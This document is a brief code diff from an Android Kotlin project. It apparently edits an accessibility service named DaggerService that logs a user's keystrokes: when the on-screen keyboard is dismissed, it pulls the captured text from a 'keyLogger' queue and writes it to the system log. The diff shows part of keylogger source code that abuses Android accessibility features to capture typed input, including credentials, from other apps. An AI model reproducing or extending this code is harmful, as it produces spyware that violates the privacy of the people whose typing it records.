@@ -19,7 +19,6 @@ import android.content.IntentFilter
 import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
-import android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK
 
 class DaggerService : AccessibilityService() {
 
@@ -76,7 +75,7 @@ class DaggerService : AccessibilityService() {
 
                     AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                         if (event.text?.toString()?.toLowerCase() == Config.KEYBOARD_DISMISSED_TEXT) {
-                            val keystrokes = keyLogger.toString()
+                            val keystrokes = keyLogger.emptyKeyQueue()
                             Log.d(TAG, "Got keystrokes: $keystrokes")
                         }
                     }
